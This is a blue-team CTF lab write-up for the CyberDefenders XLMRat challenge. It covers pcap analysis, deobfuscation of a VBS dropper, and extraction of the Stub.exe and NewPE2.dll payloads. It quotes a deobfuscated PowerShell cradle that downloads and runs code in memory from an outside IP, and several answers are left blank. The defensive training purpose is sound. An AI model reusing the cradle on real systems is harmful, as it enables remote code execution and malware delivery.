CyberDefenders CTF Lab XLMRat
---

https://cyberdefenders.org/blueteam-ctf-challenges/xlmrat/

#### Scenario

Analyze network traffic to identify malware delivery, deobfuscate scripts, and map attacker techniques using MITRE ATT&CK, focusing on stealthy execution and reflective code loading.


#### Machine Environment 

- Windows 10 running in VMware workstation
- Flare Windows Install https://github.com/mandiant/flare-vm
- WireShark


### 1.  The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?
---

	This pcap consists of 2 host conversations.
	
	Wireshark -> Statistics -> Conversations


 
	The first GET request is for a xlm.txt file sourced from 10.1.9.101 and destined to 45.126.209.4

 
 
 
	Use WireShark to export the HTTP files to your Windows Flare VM
	
	File -> Export Objects -> HTTP
	


	The xlm.txt file contains a Visual Basic Script (VBS) that declares an array and stores pieces of code that gets concatenated using a for loop.
	


 ***RUN CODE AT YOUR OWN RISK
 
  By placing the wscript.echo command we can view the output of the variable to the console.



	Open a command prompt and run the .vbs file with cscript.exe displaying the output 



	Bring the output into a text editor and clean it up.  The "[BYTe[]]" lines are not useful and probably a way to confuse people and machine.  

	$A123 = "IeX(NeW-OBJeCT NeT.W"
	$B456 = "eBCLIeNT).DOWNLO"
	$C789 = "'VAN(''http://45.126.209.4:222/mdm.jpg'')'.RePLACe('VAN','ADSTRING')"
	IeX($A123+$B456+$C789)

	This script downloads the first stage of malware and executes in into memory using Invoke-Expression (IeX)


### 2.  
Which hosting provider owns the associated IP address?
---

	Using a web site like https://whois.domaintools.com/ shows the hosting provider name.



### 3.  By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?
---

	Analyzing the mdm.jpg file we open it with a text editor to see two long HEX variables some PowerShell and VBS.  Lets isolate both HEX variables into their own files and convert those HEX files to executable.  Part of the mdm.jpg file has the script needed to convert since it performs those actions when run.  




	Spin up a simple PowerShell script to convert both HEX values to executables.
	

	
	Both newly created file details show their original filename.  Stub.exe and NewPE2.dll		
	


	Get the SHA256 of the Stub.exe file as this is the malware executable
	
	
	 

### 4.  
What is the malware family label based on Alibaba?
---


### 5.  What is the timestamp of the malware's creation?
---


### 6.  Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.
---

	We can grab the portion of LOLBin code and run it independently giving us the path.  



### 7.  The script is designed to drop several files. List the names of the files dropped by the script.
---
